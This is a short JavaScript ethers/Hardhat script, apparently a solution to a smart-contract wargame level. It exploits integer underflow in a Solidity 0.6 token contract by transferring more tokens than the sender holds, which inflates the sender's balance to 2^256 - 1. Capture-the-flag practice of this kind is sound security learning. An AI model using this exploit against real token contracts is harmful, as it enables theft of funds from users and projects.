const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x3Fe3DF3FfBe4b2A42043634899BA6e5E16a270f1'
const abi = [
    "function transfer(address _to, uint _value) public returns (bool)",
    "function balanceOf(address _owner) public view returns (uint)"
]

async function hack(contract, signer) {
    // Solidity 0.6 doesn't have overflow protection.
    // If you send more than you have, the value overflows to 2^256 - 1.
    const tx = await contract.transfer(contract.address, 21);
    await tx.wait();

    const balance = await contract.balanceOf(signer.address);
    console.log(`Balance: ${balance}`);
    console.log("Congratulations. You're officially rich.")
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})